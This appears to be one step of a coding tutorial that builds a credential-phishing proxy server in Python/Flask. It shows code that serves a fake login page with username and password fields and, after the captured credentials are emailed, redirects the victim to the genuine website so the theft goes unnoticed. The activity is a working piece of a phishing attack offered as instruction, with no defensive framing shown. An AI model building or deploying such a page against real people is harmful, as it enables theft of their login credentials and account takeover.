Redirect to the Original Website
==============








In this activity, you will learn to redirect to the original website after the credentials are emailed.




<img src= "https://s3.amazonaws.com/media-p.slid.es/uploads/1525749/images/10986032/AA2.gif" width = "480" height = "320">




Follow the given steps to complete this activity:
1. Redirect to the target URL.
* Open the file `proxy-server.py`.
* Display the index.html if the request method is GET else redirect to the target URL.
~~~python
    def serve_index():
        if(request.method == "GET"):
            return render_template('index.html', login_button = login_button
                                        , user_name_field = user_name_field
                                        , password_field = password_field)
        else:
            return redirect(target_url)
~~~


* Save and run the code to check the output.
